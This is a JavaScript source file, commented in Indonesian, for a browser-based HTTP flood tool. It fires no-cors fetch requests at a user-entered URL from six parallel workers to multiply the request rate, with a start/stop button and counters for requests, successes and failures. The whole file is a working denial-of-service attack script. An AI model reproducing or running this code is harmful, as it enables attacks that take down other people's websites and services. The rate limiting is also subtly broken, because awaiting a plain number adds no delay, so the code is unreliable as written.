let running = false;
let reqCnt = 0, okCnt = 0, failCnt = 0;
let lastReq = 0, lastTime = performance.now();

function updateStats() {
  const now = performance.now();
  const delta = (now - lastTime) / 1000;
  const rps = ((reqCnt - lastReq) / delta).toFixed(0);
  lastTime = now; lastReq = reqCnt;
  document.getElementById('req').textContent = reqCnt;
  document.getElementById('ok').textContent = okCnt;
  document.getElementById('fail').textContent = failCnt;
  document.getElementById('realRPS').textContent = rps;
}
setInterval(updateStats, 1000);

async function flood(url, rps) {
  const interval = 1000 / rps;
  while (running) {
    const t0 = performance.now();
    fetch(url, { mode: 'no-cors' }) // no-cors biar gak kena CORS
      .then(() => okCnt++)
      .catch(() => failCnt++);
    reqCnt++;
    const dt = performance.now() - t0;
    await Math.max(0, interval - dt);
  }
}

function toggleFlood() {
  const btn = document.getElementById('startBtn');
  if (running) {
    running = false;
    btn.textContent = 'START';
    btn.classList.remove('stop');
    document.getElementById('status').textContent = 'Idle';
    return;
  }
  const url = document.getElementById('url').value.trim();
  const rps = parseInt(document.getElementById('rps').value, 10);
  if (!url) return alert('Isi URL dulu!');

  running = true;
  btn.textContent = 'STOP';
  btn.classList.add('stop');
  document.getElementById('status').textContent = 'Flooding...';

  // jalankan 6 worker ringan supaya satu tab bisa ~rps*6
  for (let i = 0; i < 6; i++) flood(url, rps);
}